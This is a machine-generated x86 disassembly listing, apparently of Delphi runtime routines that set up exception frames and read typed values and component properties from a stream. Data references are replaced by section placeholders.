mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403128
sub_41cc30
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41cca0
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41cc8b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41cca0
mov eax [ ebp - 0x4 ]
call sub_41c1f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c334
retn
sub_41cca0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c0d8
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d1a8
mov eax [ ebp - 0x4 ]
call sub_41d044
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403324
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41cd62
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403324
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c0d8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41c9f4
mov eax [ ebp - 0x4 ]
call sub_41d044
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cd69
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41cd70
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41de7c
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41cff8
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41c440
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41cdb4
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41de7c
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41cff8
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c440
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41cdf8
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41de7c
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41cff8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c440
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41ce48
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41de7c
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41cff8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c440
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41ce8c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41de7c
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41bf18
mov al [ eax + lookup_table_41ceb3 ]
jmp [ eax * 4 + jump_table_41cec1 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41c440
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_403fa8
mov eax esi
call j_sub_404384
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41c440
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f0c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f0c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f0c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f0c
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41cf8c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41de7c
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41c440
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41c440
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c440
jmp r-xdata
jmp r-xdata
call sub_41bf18
sub_41cff8
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41c41c
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41cf8c
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41de7c
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c440
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41d04c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41c41c
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41de7c
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41cf8c
mov [ edi ] eax
sub_41d08c
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41d17d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403eb8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403f50
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8f4
call sub_4038f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d184
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403078
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40411c
sub_41d1a8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41d378
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_403734
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41dca0
xor edx edx
push ebp
push j_sub_403734#2
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_404178
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_4043d8
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403368
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414adc
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403368
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414adc
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41d52c
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41c42c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41c42c
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_414bd0
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41d18c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d37f
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
mov edi ebx
jmp r-xdata
sub_41d332
add [ eax ] eax
add [ eax ] al
clc
jo r-xdata
aas
add [ esi ] bh
rol [ ecx ] cl
mov ebx eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_40391c
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d37f
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
sub_41d388
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_417f68
mov ebx eax
test ebx ebx
je r-xdata
call sub_41bf18
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_414c44
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d3d0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b9ac
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4185a4
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41d410
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41d45f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e594
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_415464
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d466
lea eax [ ebp - 0x10 ]
call sub_40f018
retn
sub_41d46c
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41d51e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41c41c
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ce8c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b9ac
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4185a4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41de7c
lea eax [ ebp - 0x4 ]
call sub_4057b4
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_415600
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d525
lea eax [ ebp - 0x8 ]
call sub_403eb8
lea eax [ ebp - 0x4 ]
call sub_4057b4
retn
sub_41d52c
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d827
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d82e
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403edc
lea eax [ ebp - 0x24 ]
call sub_4045c4
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403edc
retn
jmp [ eax * 4 + jump_table_41d5bc ]
mov eax [ rw-data ]
call sub_41bf00
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414bd0
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c41c
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c4dc
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414c44
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41ce8c
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_414a78
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414c44
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cd70
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415218
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41dcdc
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414f18
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41dd98
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41502c
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41dbc0
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414c44
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c41c
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c41c
cmp al 0xd
jne r-xdata
push ebp
call sub_41d410
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cff8
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415544
jmp r-xdata
push ebp
call sub_41d46c
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414bd0
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cf8c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414c44
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41ce8c
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d388
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41de7c
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414c44
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41ce8c
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41de7c
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4154e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41de7c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414bd0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41c534
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4154e4
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41ce8c
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d3d0
pop ecx
jmp r-xdata
sub_41d834
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_403f0c
jmp r-xdata
mov eax [ ebx ]
call sub_418100
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408f48
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d894
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41dbaf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41dc7c
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41db8d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41db4e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41dca0
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41dca0
mov eax [ ebp - 0x1c ]
call sub_417c58
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41dca0
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41dca0
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41d834
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41dca0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_403070
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4179a8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41daf3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405ee4
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4185a4
xor eax eax
push ebp
push sub_41dad3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_41875c
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dada
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403128
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_418700
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41db24
call sub_40275c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403970
jmp r-xdata
call sub_40391c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41bc28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41db94
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41db53
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41bdd0
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_40391c
call sub_403970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41db94
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403128
sub_41dbc0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41dc6a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41dc3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41de7c
cmp al 0xb
je r-xdata
mov eax ebx
call sub_414948
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41bf18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41bf50
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dc71
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41dca0
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41dca0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41c440
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_403fa8
mov eax esi
call j_sub_404384
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41c440
pop edx
pop esi
pop ebx
retn
sub_41dcdc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41dd89
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c41c
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41dd98
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404140
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dd90
lea eax [ ebp - 0x8 ]
call sub_4045c4
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41de7c
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
